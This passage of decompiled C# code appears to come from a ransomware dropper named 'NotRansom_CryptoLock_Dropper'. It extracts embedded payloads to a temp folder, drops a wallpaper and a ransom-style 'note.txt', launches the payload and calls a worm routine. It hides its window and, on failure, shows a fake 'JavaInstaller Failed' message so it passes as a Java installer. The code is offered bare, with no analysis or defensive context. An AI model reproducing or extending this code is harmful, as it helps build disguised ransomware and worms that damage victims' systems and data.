			Extract("NotRansom_CryptoLock_Dropper", ".", "Resources", "w.nrcl");
			File.Copy(Path.Combine(".", "e.nrcl"), Path.Combine(tempPath, text), overwrite: true);
			File.Copy(Path.Combine(".", "w.nrcl"), Path.Combine(tempPath, "WallPaper.jpg"), overwrite: true);
			File.Copy(Path.Combine(".", "n.nrcl"), Path.Combine(folderPath, "note.txt"), overwrite: true);
			Process.Start(Path.Combine(tempPath, text));
			worm();
		}
		catch (Exception)
		{
			MessageBox.Show("JavaInstaller Failed...", "Java", (MessageBoxButtons)0, (MessageBoxIcon)16);
		}
		Environment.Exit(0);
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		((Control)this).SuspendLayout();
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 12f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(0, 0));
		((Form)this).set_ControlBox(false);
		((Control)this).set_Cursor(Cursors.get_Arrow());
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("Form1");
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_WindowState((FormWindowState)1);
		((Form)this).add_Load((EventHandler)Form1_Load);
		((Control)this).ResumeLayout(false);
	}
}
